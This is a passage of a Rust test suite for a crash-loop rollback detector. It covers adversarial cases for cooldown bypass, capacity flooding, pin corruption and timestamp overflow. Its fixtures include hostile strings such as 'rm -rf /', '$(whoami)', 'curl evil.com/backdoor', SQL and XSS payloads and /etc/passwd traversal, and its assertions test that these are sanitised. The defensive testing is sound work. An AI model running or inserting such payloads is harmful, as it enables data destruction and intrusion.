                let count = det.record_crash(&malicious_event, 3000);
                assert_eq!(count, 1);

                // Fields should be preserved as opaque strings
                let events = vec![malicious_event];
                let result = det.evaluate("reason_inject", &events, None, 3000, "tr", "ts");
                assert!(result.is_err()); // Will fail due to no pin, but should not crash
            }

            // Test incident capacity manipulation
            let capacity_attack_size = det.max_incidents * 2;

            for attack_idx in 0..capacity_attack_size {
                let attack_connector = format!("capacity_attack_{}", attack_idx);
                record_threshold_crashes(&mut det, &attack_connector, 4000 + attack_idx);
                let events = threshold_events(&attack_connector);

                let _ = det.evaluate(
                    &attack_connector,
                    &events,
                    Some(&trusted_pin_for(&attack_connector)),
                    4002 + attack_idx,
                    &format!("capacity_trace_{}", attack_idx),
                    "capacity_ts",
                );
            }

            // Should respect bounded capacity
            assert!(det.incidents.len() <= det.max_incidents);
        }

        #[test]
        fn resource_exhaustion_through_connector_namespace_pollution() {
            let mut det = CrashLoopDetector::new(config());

            // Test connector namespace flooding
            let namespace_pollution_size = 100_000;

            for pollution_idx in 0..namespace_pollution_size {
                let polluted_connector = format!("pollution_{:06x}", pollution_idx);
                let pollution_event = CrashEvent {
                    connector_id: polluted_connector.clone(),
                    timestamp: format!("pollution_time_{}", pollution_idx),
                    reason: format!("pollution_reason_{}", pollution_idx),
                };

                det.record_crash(&pollution_event, 1000 + pollution_idx);

                // Periodically verify system still responds
                if pollution_idx % 10_000 == 0 {
                    assert!(!det.is_looping_for(&polluted_connector, 1000 + pollution_idx));
                    assert_eq!(
                        det.crashes_in_window_for(&polluted_connector, 1000 + pollution_idx),
                        1
                    );
                }
            }

            // Verify memory usage is reasonable (should use BTreeMap efficiently)
            assert_eq!(det.crash_times_by_connector.len(), namespace_pollution_size);

            // Test mass evaluation performance
            let start_time = std::time::Instant::now();
            let total_crashes = det.crashes_in_window(u64::MAX);
            let elapsed = start_time.elapsed();

            assert_eq!(total_crashes as usize, namespace_pollution_size);
            assert!(
                elapsed.as_millis() < 1000,
                "Mass evaluation should complete in reasonable time"
            );

            // Test selective connector queries remain efficient
            for test_idx in [0, 50_000, 99_999] {
                let test_connector = format!("pollution_{:06x}", test_idx);
                let count = det.crashes_in_window_for(&test_connector, u64::MAX);
                assert_eq!(count, 1);
            }

            // Test memory cleanup behavior with sliding window
            let future_time = 2_000_000; // Far beyond all recorded crashes
            let future_total = det.crashes_in_window(future_time);
            assert_eq!(
                future_total, 0,
                "Sliding window should exclude all old crashes"
            );

            // Verify internal cleanup occurs (implementation-dependent)
            for test_idx in [0, 25_000, 75_000] {
                let test_connector = format!("pollution_{:06x}", test_idx);
                let count = det.crashes_in_window_for(&test_connector, future_time);
                assert_eq!(count, 0);
            }
        }

        #[test]
        fn cooldown_bypass_and_state_manipulation_attacks() {
            let mut det = CrashLoopDetector::new(CrashLoopConfig {
                max_crashes: 2,
                window_secs: 60,
                cooldown_secs: 120,
            });

            let attack_connector = "bypass_conn";

            // Establish initial rollback
            record_threshold_crashes(&mut det, attack_connector, 1000);
            let initial_events = threshold_events(attack_connector);
            let initial_result = det
                .evaluate(
                    attack_connector,
                    &initial_events,
                    Some(&trusted_pin_for(attack_connector)),
                    1002,
                    "initial",
                    "ts_initial",
                )
                .unwrap();
            assert!(initial_result.rollback_allowed);

            // Test cooldown bypass through time manipulation
            let cooldown_bypass_attempts = [
                1003, // Immediately after rollback
                1050, // Mid-cooldown
                1121, // Just before cooldown end
                1122, // Exactly at cooldown boundary
            ];

            for bypass_time in cooldown_bypass_attempts {
                record_threshold_crashes(&mut det, attack_connector, bypass_time);
                let bypass_events = threshold_events(attack_connector);

                let result = det.evaluate(
                    attack_connector,
                    &bypass_events,
                    Some(&trusted_pin_for(attack_connector)),
                    bypass_time + 2,
                    &format!("bypass_{}", bypass_time),
                    "ts_bypass",
                );

                assert!(
                    result.is_err(),
                    "Cooldown should prevent rollback at time {}",
                    bypass_time
                );
                assert_eq!(result.unwrap_err().code(), "CLD_COOLDOWN_ACTIVE");
            }

            // Test cross-connector cooldown isolation
            let other_connector = "isolated_conn";
            record_threshold_crashes(&mut det, other_connector, 1050); // During first connector's cooldown
            let isolated_events = threshold_events(other_connector);

            let isolated_result = det.evaluate(
                other_connector,
                &isolated_events,
                Some(&trusted_pin_for(other_connector)),
                1052,
                "isolated",
                "ts_isolated",
            );

            assert!(
                isolated_result.is_ok(),
                "Other connector should not be affected by cooldown"
            );
            assert!(isolated_result.unwrap().rollback_allowed);

            // Test cooldown calculation with arithmetic edge cases
            let edge_rollback_times = [
                u64::MAX - 200, // Near overflow
                u64::MAX - 121,
                u64::MAX - 120,
                u64::MAX - 119,
            ];

            for &edge_time in &edge_rollback_times {
                let edge_connector = format!("edge_conn_{}", edge_time);

                // Manually insert rollback time
                det.last_rollback_epoch_by_connector
                    .insert(edge_connector.clone(), edge_time);

                // Test cooldown calculations near u64::MAX
                let cooldown_active = det.in_cooldown_for(&edge_connector, edge_time + 100);
                let remaining = det.cooldown_remaining_for(&edge_connector, edge_time + 100);

                // Should handle overflow gracefully
                assert!(
                    cooldown_active,
                    "Cooldown should be active for edge case {}",
                    edge_time
                );
                assert!(
                    remaining <= 120,
                    "Remaining time should be bounded for edge case {}",
                    edge_time
                );
            }

            // Test cooldown state consistency across multiple queries
            assert!(det.in_cooldown_for(attack_connector, 1100));
            assert!(det.in_cooldown_for(attack_connector, 1100)); // Repeated query
            assert_eq!(
                det.cooldown_remaining_for(attack_connector, 1100),
                det.cooldown_remaining_for(attack_connector, 1100)
            ); // Should be deterministic

            // Test final cooldown expiration
            let post_cooldown_time = 1125; // Past cooldown period
            assert!(!det.in_cooldown_for(attack_connector, post_cooldown_time));
            assert_eq!(
                det.cooldown_remaining_for(attack_connector, post_cooldown_time),
                0
            );
        }

        #[test]
        fn evaluation_race_conditions_and_state_consistency_validation() {
            let mut det = CrashLoopDetector::new(config());

            // Simulate rapid-fire evaluation attempts
            let race_connector = "race_test_conn";
            let rapid_evaluations = 100;

            // Pre-populate with threshold crashes
            record_threshold_crashes(&mut det, race_connector, 1000);
            let race_events = threshold_events(race_connector);

            let mut evaluation_results = Vec::new();

            // Rapid evaluations simulating concurrent access patterns
            for eval_idx in 0..rapid_evaluations {
                let pin = if eval_idx % 3 == 0 {
                    Some(trusted_pin_for(race_connector))
                } else if eval_idx % 3 == 1 {
                    Some(untrusted_pin())
                } else {
                    None
                };

                let result = det.evaluate(
                    race_connector,
                    &race_events,
                    pin.as_ref(),
                    1002 + eval_idx,
                    &format!("race_trace_{}", eval_idx),
                    &format!("race_ts_{}", eval_idx),
                );

                evaluation_results.push((eval_idx, result));

                // Inject additional crashes during evaluation sequence
                if eval_idx % 10 == 0 {
                    let extra_event = crash(race_connector, "extra", "race_crash");
                    det.record_crash(&extra_event, 1002 + eval_idx);
                }
            }

            // Verify state consistency
            let mut successful_rollbacks = 0;
            let mut cooldown_blocks = 0;
            let mut trust_errors = 0;
            let mut no_pin_errors = 0;

            for (idx, result) in evaluation_results {
                match result {
                    Ok(decision) => {
                        if decision.rollback_allowed {
                            successful_rollbacks += 1;
                        }
                    }
                    Err(err) => match err {
                        CrashLoopError::CooldownActive { .. } => cooldown_blocks += 1,
                        CrashLoopError::PinUntrusted { .. } => trust_errors += 1,
                        CrashLoopError::NoKnownGood { .. } => no_pin_errors += 1,
                        CrashLoopError::PinConnectorMismatch { .. } => trust_errors += 1,
                        _ => panic!("Unexpected error at evaluation {}: {:?}", idx, err),
                    },
                }
            }

            // Should have consistent behavior patterns
            assert_eq!(
                successful_rollbacks, 1,
                "Should have exactly one successful rollback"
            );
            assert!(
                cooldown_blocks > 0,
                "Should have cooldown blocks after first rollback"
            );
            assert!(trust_errors > 0, "Should have trust-related errors");
            assert!(no_pin_errors > 0, "Should have no-pin errors");

            // Verify incident trail consistency
            assert_eq!(det.incidents.len(), rapid_evaluations);

            // Verify final state consistency
            assert!(det.in_cooldown_for(race_connector, 2000));
            let final_crash_count = det.crashes_in_window_for(race_connector, 2000);
            assert!(
                final_crash_count >= 3,
                "Should have accumulated crashes from race conditions"
            );
        }
    }

    // ═══ EXTREME ADVERSARIAL NEGATIVE-PATH TESTS ═══
    // These tests target sophisticated attack vectors against crash-loop detection and rollback systems

    #[test]
    fn test_extreme_adversarial_crash_event_injection_attack() {
        // Test crash event injection attacks where attacker crafts malicious crash events
        // to manipulate rollback decisions, bypass cooldowns, or cause false positives

        let mut detector = CrashLoopDetector::new();

        // Malicious crash event injection attack patterns
        let malicious_crash_events = [
            // Control character injection in connector IDs
            CrashEvent {
                connector_id: "connector\x00null_injection".to_string(),
                timestamp: "2024-01-01T12:00:00Z".to_string(),
                reason: "legitimate_crash".to_string(),
            },
            CrashEvent {
                connector_id: "connector\r\nCRLF_injection".to_string(),
                timestamp: "2024-01-01T12:01:00Z".to_string(),
                reason: "system_error".to_string(),
            },
            CrashEvent {
                connector_id: "connector\x1B[31mRED_ALERT\x1B[0m".to_string(),
                timestamp: "2024-01-01T12:02:00Z".to_string(),
                reason: "memory_corruption".to_string(),
            },
            // Command injection in crash reasons
            CrashEvent {
                connector_id: "victim_connector".to_string(),
                timestamp: "2024-01-01T12:03:00Z".to_string(),
                reason: "crash; rm -rf / #".to_string(),
            },
            CrashEvent {
                connector_id: "victim_connector".to_string(),
                timestamp: "2024-01-01T12:04:00Z".to_string(),
                reason: "error $(whoami)".to_string(),
            },
            CrashEvent {
                connector_id: "victim_connector".to_string(),
                timestamp: "2024-01-01T12:05:00Z".to_string(),
                reason: "failure && curl evil.com/backdoor".to_string(),
            },
            // JSON injection in timestamps
            CrashEvent {
                connector_id: "json_victim".to_string(),
                timestamp: "2024-01-01T12:06:00Z\",\"injected\":\"evil".to_string(),
                reason: "timing_attack".to_string(),
            },
            CrashEvent {
                connector_id: "json_victim".to_string(),
                timestamp: "2024-01-01T12:07:00Z}],\"evil\":[{\"timestamp".to_string(),
                reason: "structure_injection".to_string(),
            },
            // Unicode bidirectional injection
            CrashEvent {
                connector_id: "unicode\u{202E}detcennoC".to_string(), // Right-to-Left Override
                timestamp: "2024-01-01T12:08:00Z".to_string(),
                reason: "unicode\u{200B}hidden_crash".to_string(), // Zero-width space
            },
            // Path traversal injection
            CrashEvent {
                connector_id: "../../../etc/passwd".to_string(),
                timestamp: "2024-01-01T12:09:00Z".to_string(),
                reason: "../../../var/log/evil.log".to_string(),
            },
            // SQL injection patterns
            CrashEvent {
                connector_id: "connector'; DROP TABLE crashes; --".to_string(),
                timestamp: "2024-01-01T12:10:00Z".to_string(),
                reason: "' OR '1'='1".to_string(),
            },
            // Buffer overflow simulation
            CrashEvent {
                connector_id: "A".repeat(100000),
                timestamp: "2024-01-01T12:11:00Z".to_string(),
                reason: "B".repeat(100000),
            },
            // Format string injection
            CrashEvent {
                connector_id: "format_victim".to_string(),
                timestamp: "2024-01-01T12:12:00Z".to_string(),
                reason: "%n%s%x%d crash".to_string(),
            },
            // XML/HTML injection
            CrashEvent {
                connector_id: "xml_victim".to_string(),
                timestamp: "2024-01-01T12:13:00Z".to_string(),
                reason: "<script>alert('xss')</script>".to_string(),
            },
            // Environment variable injection
            CrashEvent {
                connector_id: "env_victim".to_string(),
                timestamp: "2024-01-01T12:14:00Z".to_string(),
                reason: "${PATH} injection".to_string(),
            },
        ];

        for (attack_idx, malicious_event) in malicious_crash_events.iter().enumerate() {
            println!(
                "Testing crash injection attack {}: {}",
                attack_idx,
                if malicious_event.connector_id.len() > 50 {
                    format!("{}...", &malicious_event.connector_id[..50])
                } else {
                    malicious_event.connector_id.clone()
                }
            );

            // Attempt to inject malicious crash event
            let injection_result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                detector.record_crash(
                    malicious_event.clone(),
                    1000 + attack_idx as u64,
                    format!("injection_trace_{}", attack_idx),
                );
            }));

            match injection_result {
                Ok(()) => {
                    // If injection succeeds, verify it's handled safely
                    let crashes = detector.crashes_for(&malicious_event.connector_id);

                    // Verify crash event sanitization
                    for crash in crashes {
                        assert!(
                            !crash.connector_id.contains('\0'),
                            "Attack {}: Connector ID should not contain null bytes",
                            attack_idx
                        );
                        assert!(
                            !crash.connector_id.contains("rm -rf"),
                            "Attack {}: Connector ID should not contain command injection",
                            attack_idx
                        );
                        assert!(
                            !crash.connector_id.contains("DROP TABLE"),
                            "Attack {}: Connector ID should not contain SQL injection",
                            attack_idx
                        );

                        assert!(
                            !crash.reason.contains('\0'),
                            "Attack {}: Crash reason should not contain null bytes",
                            attack_idx
                        );
                        assert!(
                            !crash.reason.contains("rm -rf"),
                            "Attack {}: Crash reason should not contain command injection",
                            attack_idx
                        );
                        assert!(
                            !crash.reason.contains("$("),
                            "Attack {}: Crash reason should not contain command substitution",
                            attack_idx
                        );

                        assert!(
                            !crash.timestamp.contains('\0'),
                            "Attack {}: Timestamp should not contain null bytes",
                            attack_idx
                        );
                        assert!(
                            !crash.timestamp.contains("\"injected\":"),
                            "Attack {}: Timestamp should not contain JSON injection",
                            attack_idx
                        );

                        // Verify length limits
                        assert!(
                            crash.connector_id.len() <= 10000,
                            "Attack {}: Connector ID should have reasonable length limit",
                            attack_idx
                        );
                        assert!(
                            crash.reason.len() <= 10000,
                            "Attack {}: Crash reason should have reasonable length limit",
                            attack_idx
                        );
                    }

                    // Test crash count accuracy despite injection
                    let crash_count = detector.crashes_in_window_for(
                        &malicious_event.connector_id,
                        1100 + attack_idx as u64,
                    );
                    assert!(
                        crash_count <= 1,
                        "Attack {}: Crash count should be accurate despite injection",
                        attack_idx
                    );

                    // Test that injection doesn't affect other connectors
                    let legitimate_connector = "legitimate_connector";
                    let legit_count = detector
                        .crashes_in_window_for(legitimate_connector, 1100 + attack_idx as u64);
                    assert_eq!(
                        legit_count, 0,
                        "Attack {}: Injection should not affect other connectors",
                        attack_idx
                    );
                }
                Err(_) => {
                    // Panic during injection - handled by catch_unwind
                    println!("Attack {} caused panic (safely caught)", attack_idx);
                }
            }

            // Test evaluation with injected events
            let pin = KnownGoodPin {
                connector_id: malicious_event.connector_id.clone(),
                version: "1.0.0".to_string(),
                pin_hash: "safe_hash".to_string(),
                trusted: true,
            };

            let eval_result = detector.evaluate_rollback(
                &malicious_event.connector_id,
                &pin,
                1200 + attack_idx as u64,
                format!("eval_trace_{}", attack_idx),
            );

            match eval_result {
                Ok(decision) => {
                    // Verify decision integrity despite injection
                    assert!(
                        !decision.connector_id.contains('\0'),
                        "Attack {}: Decision connector ID should be sanitized",
                        attack_idx
                    );
                    assert!(
                        !decision.reason.contains('\0'),
                        "Attack {}: Decision reason should be sanitized",
                        attack_idx
                    );
                    assert!(
                        !decision.trace_id.contains('\0'),
                        "Attack {}: Decision trace ID should be sanitized",
                        attack_idx
                    );

                    // Test serialization safety
                    let decision_debug = format!("{:?}", decision);
                    assert!(
                        !decision_debug.contains('\0'),
                        "Attack {}: Decision debug output should be safe",
                        attack_idx
                    );
                    assert!(
                        !decision_debug.contains("rm -rf"),
                        "Attack {}: Decision debug should not contain command injection",
                        attack_idx
                    );
                }
                Err(e) => {
                    // Error handling should be safe
                    let error_debug = format!("{:?}", e);
                    assert!(
                        !error_debug.contains('\0'),
                        "Attack {}: Error debug should not contain null bytes",
                        attack_idx
                    );
                    assert!(
                        !error_debug.contains("rm -rf"),
                        "Attack {}: Error debug should not contain command injection",
                        attack_idx
                    );
                }
            }
        }

        // Test system recovery after injection attacks
        let recovery_event = CrashEvent {
            connector_id: "recovery_connector".to_string(),
            timestamp: "2024-01-01T13:00:00Z".to_string(),
            reason: "clean_crash".to_string(),
        };

        detector.record_crash(recovery_event, 2000, "recovery_trace".to_string());
        let recovery_count = detector.crashes_in_window_for("recovery_connector", 2000);
        assert_eq!(
            recovery_count, 1,
            "System should recover correctly after injection attacks"
        );

        println!(
            "Crash injection attack test completed: {} attack vectors tested",
            malicious_crash_events.len()
        );
    }

    #[test]
    fn test_extreme_adversarial_rollback_pin_corruption_attack() {
        // Test rollback pin corruption attacks where attacker manipulates known-good pins
        // to cause malicious rollbacks or prevent legitimate rollbacks

        let mut detector = CrashLoopDetector::new();

        // Create legitimate crash pattern to trigger rollback evaluation
        let target_connector = "pin_corruption_target";
        for i in 0..10 {
            detector.record_crash(
                CrashEvent {
                    connector_id: target_connector.to_string(),
                    timestamp: format!("2024-01-01T12:{:02}:00Z", i),
                    reason: format!("crash_{}", i),
                },
                1000 + i,
                format!("setup_crash_{}", i),
            );
        }

        // Malicious pin corruption attack patterns
        let corrupted_pins = [
            // Command injection in version field
            KnownGoodPin {
                connector_id: target_connector.to_string(),
                version: "1.0.0; rm -rf /".to_string(),
                pin_hash: "legitimate_hash".to_string(),
                trusted: true,
            },
            // Path traversal in version
            KnownGoodPin {
                connector_id: target_connector.to_string(),
                version: "../../../etc/passwd".to_string(),
                pin_hash: "legitimate_hash".to_string(),
                trusted: true,
            },
            // Null byte injection in pin hash
            KnownGoodPin {
                connector_id: target_connector.to_string(),
                version: "1.0.0".to_string(),
                pin_hash: "hash\x00malicious_suffix".to_string(),
                trusted: true,
            },
            // Unicode bidirectional override in version
            KnownGoodPin {
                connector_id: target_connector.to_string(),
                version: "1.0.0\u{202E}noisrev_laiceps".to_string(),
                pin_hash: "legitimate_hash".to_string(),
                trusted: true,
            },
            // SQL injection in pin hash
            KnownGoodPin {
                connector_id: target_connector.to_string(),
                version: "1.0.0".to_string(),
                pin_hash: "hash'; DROP TABLE pins; --".to_string(),
                trusted: true,
            },
            // JSON injection in connector ID
            KnownGoodPin {
                connector_id: format!("{}\",\"injected\":\"evil", target_connector),
                version: "1.0.0".to_string(),
                pin_hash: "legitimate_hash".to_string(),
                trusted: true,
            },
            // Control character flood in version
            KnownGoodPin {
                connector_id: target_connector.to_string(),
                version: "1.0.0\x01\x02\x03\x04\x05".to_string(),
                pin_hash: "legitimate_hash".to_string(),
                trusted: true,
            },
            // ANSI escape sequence injection
            KnownGoodPin {
                connector_id: target_connector.to_string(),
                version: "1.0.0\x1B[31mHACKED\x1B[0m".to_string(),
                pin_hash: "legitimate_hash".to_string(),
                trusted: true,
            },
            // Buffer overflow simulation
            KnownGoodPin {
                connector_id: target_connector.to_string(),
                version: "C".repeat(100000),
                pin_hash: "D".repeat(100000),
                trusted: true,
            },
            // Trust manipulation with malicious data
            KnownGoodPin {
                connector_id: target_connector.to_string(),
                version: "evil_version".to_string(),
                pin_hash: "evil_hash".to_string(),
                trusted: false, // Explicitly untrusted but with malicious data
            },
            // Cross-connector confusion attack
            KnownGoodPin {
                connector_id: "different_connector".to_string(), // Wrong connector
                version: "1.0.0".to_string(),
                pin_hash: "legitimate_hash".to_string(),
                trusted: true,
            },
        ];

        for (pin_idx, corrupted_pin) in corrupted_pins.iter().enumerate() {
            println!(
                "Testing pin corruption attack {}: {}",
                pin_idx, corrupted_pin.version
            );

            // Attempt rollback evaluation with corrupted pin
            let corruption_result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                detector.evaluate_rollback(
                    target_connector,
                    corrupted_pin,
                    2000 + pin_idx as u64,
                    format!("pin_corruption_trace_{}", pin_idx),
                )
            }));

            match corruption_result {
                Ok(eval_result) => {
                    match eval_result {
                        Ok(decision) => {
                            // If corruption succeeds, verify security measures
                            if decision.triggered {
                                // Rollback triggered - verify pin validation
                                if let Some(ref target) = decision.rollback_target {
                                    // Verify target pin sanitization
                                    assert!(
                                        !target.version.contains('\0'),
                                        "Pin {}: Target version should not contain null bytes",
                                        pin_idx
                                    );
                                    assert!(
                                        !target.version.contains("rm -rf"),
                                        "Pin {}: Target version should not contain command injection",
                                        pin_idx
                                    );
                                    assert!(
                                        !target.version.contains("DROP TABLE"),
                                        "Pin {}: Target version should not contain SQL injection",
                                        pin_idx
                                    );

                                    assert!(
                                        !target.pin_hash.contains('\0'),
                                        "Pin {}: Target hash should not contain null bytes",
                                        pin_idx
                                    );
                                    assert!(
                                        !target.pin_hash.contains("';"),
                                        "Pin {}: Target hash should not contain SQL injection",
                                        pin_idx
                                    );

                                    assert!(
                                        !target.connector_id.contains('\0'),
                                        "Pin {}: Target connector ID should not contain null bytes",
                                        pin_idx
                                    );
                                    assert!(
                                        !target.connector_id.contains("\"injected\":"),
                                        "Pin {}: Target connector ID should not contain JSON injection",
                                        pin_idx
                                    );

                                    // Verify length limits
                                    assert!(
                                        target.version.len() <= 10000,
                                        "Pin {}: Target version should have reasonable length",
                                        pin_idx
                                    );
                                    assert!(
                                        target.pin_hash.len() <= 10000,
                                        "Pin {}: Target hash should have reasonable length",
                                        pin_idx
                                    );
                                }

                                // Verify rollback decision integrity
                                assert_eq!(
                                    decision.rollback_allowed, corrupted_pin.trusted,
                                    "Pin {}: Rollback allowed should match pin trust status",
                                    pin_idx
                                );

                                // Cross-connector validation
                                if corrupted_pin.connector_id != target_connector {
                                    assert!(
                                        !decision.triggered || !decision.rollback_allowed,
                                        "Pin {}: Cross-connector rollback should be rejected",
                                        pin_idx
                                    );
                                }
                            }

                            // Verify decision sanitization
                            assert!(
                                !decision.reason.contains('\0'),
                                "Pin {}: Decision reason should not contain null bytes",
                                pin_idx
                            );
                            assert!(
                                !decision.trace_id.contains('\0'),
                                "Pin {}: Decision trace ID should not contain null bytes",
                                pin_idx
                            );
                        }
                        Err(e) => {
                            // Expected behavior for many corruption attempts
                            match e {
                                CrashLoopError::PinUntrusted { .. } => {
                                    // Expected for untrusted pins
                                }
                                CrashLoopError::PinConnectorMismatch { .. } => {
                                    // Expected for wrong connector
                                }
                                _ => {
                                    // Other errors should be meaningful
                                    let error_msg = format!("{:?}", e);
                                    assert!(
                                        !error_msg.contains('\0'),
                                        "Pin {}: Error should not contain null bytes",
                                        pin_idx
                                    );
                                    assert!(
                                        !error_msg.contains("rm -rf"),
                                        "Pin {}: Error should not contain command injection",
                                        pin_idx
                                    );
                                }
                            }
                        }
                    }
                }
                Err(_) => {
                    // Panic during corruption handling - caught by catch_unwind
                    println!("Pin corruption {} caused panic (safely caught)", pin_idx);
                }
            }

            // Test incident recording with corrupted pins
            let incident_count_before = detector.incidents.len();

            // Incidents should be recorded safely regardless of pin corruption
            // (The incident was already recorded during evaluate_rollback)
            let incident_count_after = detector.incidents.len();
            assert!(
                incident_count_after >= incident_count_before,
                "Pin {}: Incidents should be recorded despite corruption",
                pin_idx
            );
        }

        // Test system integrity after corruption attacks
        let clean_pin = KnownGoodPin {
            connector_id: target_connector.to_string(),
            version: "1.0.1".to_string(),
            pin_hash: "clean_hash".to_string(),
            trusted: true,
        };

        let recovery_result = detector.evaluate_rollback(
            target_connector,
            &clean_pin,
            3000,
            "recovery_after_corruption".to_string(),
        );

        assert!(
            recovery_result.is_ok(),
            "System should recover correctly after pin corruption attacks"
        );

        if let Ok(recovery_decision) = recovery_result {
            assert!(
                recovery_decision.triggered,
                "Clean pin should trigger rollback after sufficient crashes"
            );
            assert!(
                recovery_decision.rollback_allowed,
                "Clean pin should allow rollback"
            );
        }

        println!(
            "Pin corruption attack test completed: {} corrupted pins tested",
            corrupted_pins.len()
        );
    }

    #[test]
    fn test_extreme_adversarial_timestamp_manipulation_attack() {
        // Test timestamp manipulation attacks where attacker crafts malicious timestamps
        // to bypass sliding window detection, cause integer overflow, or manipulate timing

        let mut detector = CrashLoopDetector::new();
        let target_connector = "timestamp_victim";

        // Malicious timestamp manipulation patterns
        let malicious_timestamps = [
            // Extreme future timestamps
            u64::MAX,                // Maximum possible timestamp
            u64::MAX - 1,            // Near maximum
            18446744073709551615u64, // 2^64 - 1 explicitly
            9223372036854775807u64,  // i64::MAX (signed max)
            // Extreme past timestamps
            0,     // Unix epoch
            1,     // Minimal positive
            86400, // One day after epoch
            // Overflow attempt values
            18446744073709551000u64, // Near overflow boundary
            u64::MAX - 300,          // Just under max with window consideration
            u64::MAX / 2,            // Half of maximum range
            // Arithmetic edge cases
            300,           // Equal to typical window size
            299,           // Just under window
            301,           // Just over window
            600,           // Double window
            4294967295u64, // u32::MAX
            4294967296u64, // u32::MAX + 1
        ];

        for (ts_idx, malicious_timestamp) in malicious_timestamps.iter().enumerate() {
            println!(
                "Testing timestamp manipulation {}: timestamp {}",
                ts_idx, malicious_timestamp
            );

            // Create crash event with malicious timestamp
            let timestamp_attack_event = CrashEvent {
                connector_id: target_connector.to_string(),
                timestamp: format!("timestamp_{}", malicious_timestamp), // Non-standard format
                reason: format!("timestamp_manipulation_{}", ts_idx),
            };

            // Test crash recording with manipulated timestamp
            let record_result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                detector.record_crash(
                    timestamp_attack_event.clone(),
                    *malicious_timestamp,
                    format!("timestamp_attack_trace_{}", ts_idx),
                );
            }));

            match record_result {
                Ok(()) => {
                    // Test crash count with timestamp manipulation
                    let crash_count =
                        detector.crashes_in_window_for(target_connector, *malicious_timestamp);

                    // Verify crash counting handles extreme timestamps safely
                    assert!(
                        crash_count <= 100,
                        "Timestamp attack {}: Crash count should be bounded: {}",
                        ts_idx,
                        crash_count
                    );

                    // Test window calculation safety
                    let window_start = malicious_timestamp.saturating_sub(300); // Safe subtraction
                    let crashes_alt =
                        detector.crashes_in_window_for(target_connector, *malicious_timestamp);

                    // Verify consistent counting
                    assert_eq!(
                        crash_count, crashes_alt,
                        "Timestamp attack {}: Window calculation should be consistent",
                        ts_idx
                    );

                    // Test overflow in arithmetic operations
                    let future_timestamp = malicious_timestamp.saturating_add(1000);
                    let future_count =
                        detector.crashes_in_window_for(target_connector, future_timestamp);

                    // Should handle arithmetic overflow gracefully
                    assert!(
                        future_count <= crash_count.saturating_add(1),
                        "Timestamp attack {}: Future count should be reasonable",
                        ts_idx
                    );
                }
                Err(_) => {
                    println!("Timestamp attack {} caused panic (safely caught)", ts_idx);
                }
            }

            // Test cooldown calculations with extreme timestamps
            let cooldown_result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                detector.in_cooldown_for(target_connector, *malicious_timestamp)
            }));

            match cooldown_result {
                Ok(in_cooldown) => {
                    // Cooldown calculation should complete without error
                    println!(
                        "Timestamp attack {}: cooldown status = {}",
                        ts_idx, in_cooldown
                    );
                }
                Err(_) => {
                    println!("Timestamp attack {} cooldown check caused panic", ts_idx);
                }
            }

            // Test evaluation with manipulated timestamps
            let pin = KnownGoodPin {
                connector_id: target_connector.to_string(),
                version: "1.0.0".to_string(),
                pin_hash: "timestamp_test_hash".to_string(),
                trusted: true,
            };

            let eval_result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                detector.evaluate_rollback(
                    target_connector,
                    &pin,
                    *malicious_timestamp,
                    format!("timestamp_eval_{}", ts_idx),
                )
            }));

            match eval_result {
                Ok(result) => {
                    match result {
                        Ok(decision) => {
                            // Verify decision timestamps are handled safely
                            assert!(
                                !decision.timestamp.is_empty(),
                                "Timestamp attack {}: Decision should have timestamp",
                                ts_idx
                            );
                            assert!(
                                decision.window_secs > 0,
                                "Timestamp attack {}: Window should be positive",
                                ts_idx
                            );

                            // Verify no overflow in crash count
                            assert!(
                                decision.crash_count <= 10000,
                                "Timestamp attack {}: Crash count should be reasonable",
                                ts_idx
                            );
                        }
                        Err(e) => {
                            // Error handling should be safe
                            let error_str = format!("{:?}", e);
                            assert!(
                                error_str.len() > 0,
                                "Timestamp attack {}: Error should be meaningful",
                                ts_idx
                            );
                        }
                    }
                }
                Err(_) => {
                    println!("Timestamp attack {} evaluation caused panic", ts_idx);
                }
            }
        }

        // Test timestamp ordering and consistency
        let ordered_timestamps = [1000u64, 2000, 3000, 4000, 5000];
        for (order_idx, &ts) in ordered_timestamps.iter().enumerate() {
            detector.record_crash(
                CrashEvent {
                    connector_id: "ordering_test".to_string(),
                    timestamp: format!("order_{}", order_idx),
                    reason: "ordering_crash".to_string(),
                },
                ts,
                format!("ordering_trace_{}", order_idx),
            );
        }

        // Verify ordered timestamps work correctly
        let ordered_count = detector.crashes_in_window_for("ordering_test", 5000);
        assert!(
            ordered_count > 0,
            "Ordered timestamps should register crashes"
        );
        assert!(
            ordered_count <= 5,
            "Ordered timestamps should not exceed actual crash count"
        );

        // Test concurrent timestamp attacks
        let concurrent_timestamps = [
            10000u64, 10000, 10000, 10000, 10000, // Same timestamp
            10001, 10001, 10002, 10002, 10003, // Close timestamps
        ];

        for (conc_idx, &ts) in concurrent_timestamps.iter().enumerate() {
            detector.record_crash(
                CrashEvent {
                    connector_id: "concurrent_test".to_string(),
                    timestamp: format!("concurrent_{}", conc_idx),
                    reason: "concurrent_crash".to_string(),
                },
                ts,
                format!("concurrent_trace_{}", conc_idx),
            );
        }

        let concurrent_count = detector.crashes_in_window_for("concurrent_test", 10010);
        assert!(
            concurrent_count > 0,
            "Concurrent timestamps should register"
        );
        assert!(
            concurrent_count <= 10,
            "Concurrent count should be reasonable"
        );

        println!(
            "Timestamp manipulation attack test completed: {} malicious timestamps + ordering + concurrency tested",
            malicious_timestamps.len()
        );
    }

    #[test]
    fn test_extreme_adversarial_cooldown_bypass_attack() {
        // Test cooldown bypass attacks where attacker attempts to circumvent
        // cooldown periods to trigger rapid rollbacks or bypass rate limiting

        let mut detector = CrashLoopDetector::new();
        let bypass_connector = "cooldown_bypass_target";

        // Create initial crash pattern to trigger rollback and cooldown
        for i in 0..6 {
            detector.record_crash(
                CrashEvent {
                    connector_id: bypass_connector.to_string(),
                    timestamp: format!("2024-01-01T12:{:02}:00Z", i),
                    reason: format!("initial_crash_{}", i),
                },
                1000 + i,
                format!("initial_trace_{}", i),
            );
        }

        // Trigger initial rollback to activate cooldown
        let pin = KnownGoodPin {
            connector_id: bypass_connector.to_string(),
            version: "1.0.0".to_string(),
            pin_hash: "initial_hash".to_string(),
            trusted: true,
        };

        let initial_rollback = detector.evaluate_rollback(
            bypass_connector,
            &pin,
            1010,
            "initial_rollback_trace".to_string(),
        );

        // Verify initial rollback succeeded and cooldown is active
